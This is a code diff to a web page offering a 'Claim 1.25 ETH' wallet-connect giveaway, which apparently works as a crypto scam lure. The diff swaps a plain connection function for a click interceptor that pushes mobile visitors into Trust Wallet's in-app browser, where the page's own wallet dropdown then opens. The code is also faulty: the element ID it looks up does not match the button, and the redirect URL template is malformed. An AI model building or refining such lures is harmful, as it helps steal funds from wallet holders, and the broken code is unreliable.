@@ -111,41 +111,29 @@
                 </div>
 
                 <div class="">
-    <button id="" class="eth-claim-button"><i class="fas fa-wallet"></i> Connect Wallet & Claim 1.25 ETH</button>
+    <button id="ethConnectWallet" class="eth-claim-button"><i class="fas fa-wallet"></i> Connect Wallet & Claim 1.25 ETH</button>
 </div>
 
 <script>
-  const connectBtn = document.getElementById('ethConnectWallet');
+  const connectBtn = document.getElementById('Connectflow');
 
-  connectBtn.addEventListener('click', () => {
+  connectBtn.addEventListener('click', (event) => {
     const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
     const hasInjectedWallet = typeof window.ethereum !== 'undefined';
 
-    // If on a mobile browser outside of a dApp browser, redirect to Trust Wallet
+    // 1. Intercept the click FIRST if on a mobile browser without a wallet
     if (isMobile && !hasInjectedWallet) {
+      event.preventDefault();
+      event.stopImmediatePropagation(); // Blocks your old dropdown from opening!
+
       const dappUrl = encodeURIComponent(window.location.href);
       window.location.href = `https://trustwallet.com{dappUrl}`;
-    } else {
-      // User is already inside Trust Wallet's dApp browser (or on desktop with an extension)
-      // Put your normal Web3 wallet connection code here:
-      connectWallet(); 
     }
-  });
-
-  async function connectWallet() {
-    if (typeof window.ethereum !== 'undefined') {
-      try {
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        console.log('Connected account:', accounts[0]);
-      } catch (error) {
-        console.error('Connection rejected:', error);
-      }
-    } else {
-      alert('Please install a Web3 wallet like Trust Wallet or MetaMask.');
-    }
-  }
+    
+    // 2. If they ARE inside Trust Wallet (or on desktop), we do nothing here.
+    // The event continues naturally and opens your existing dropdown!
+  }, true); // <-- The 'true' forces this code to run BEFORE any existing listeners
 </script>
-
                 <div id="ethSuccessMessage" class="eth-success-message">
                     <i class="fas fa-check-circle" style="font-size:3rem;"></i>
                     <div style="font-size:1.3rem;font-weight:700;color:#22C55E;margin-bottom:8px;">Claim Successful</div>
